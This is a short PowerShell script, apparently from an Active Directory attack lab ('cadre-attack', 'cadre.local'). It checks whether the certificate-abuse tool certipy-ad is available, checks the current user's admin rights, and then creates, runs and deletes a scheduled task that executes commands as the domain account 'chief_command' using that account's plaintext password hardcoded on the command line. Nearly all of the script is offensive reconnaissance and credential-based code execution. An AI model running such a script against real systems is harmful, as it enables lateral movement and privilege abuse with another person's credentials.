$ErrorActionPreference = "Stop"
Write-Output "=== internet check ==="
try {
    $r = Invoke-WebRequest -Uri "https://pypi.org/simple/certipy-ad/" -Method Head -TimeoutSec 8 -UseBasicParsing
    Write-Output ("PYPI_STATUS " + $r.StatusCode)
} catch {
    Write-Output ("PYPI_FAIL " + $_.Exception.Message)
}
Write-Output "=== pip certipy installed? ==="
python -m pip show certipy-ad 2>&1
Write-Output "=== whoami ==="
whoami
Write-Output "=== chief_command local admin? ==="
$id = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$p = New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
Write-Output ("IsAdmin " + $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))
Write-Output "=== test create scheduled task as chief_command ==="
schtasks /Create /TN "cadre-test-runas" /TR "cmd /c whoami > C:\Tools\cadre-attack\runas-test.txt 2>&1" /SC ONCE /ST 23:59 /RU "cadre.local\chief_command" /RP "C0mm@nd_Ch1ef!" /F 2>&1
schtasks /Run /TN "cadre-test-runas" 2>&1
Start-Sleep -Seconds 3
Get-Content C:\Tools\cadre-attack\runas-test.txt 2>&1
schtasks /Delete /TN "cadre-test-runas" /F 2>&1
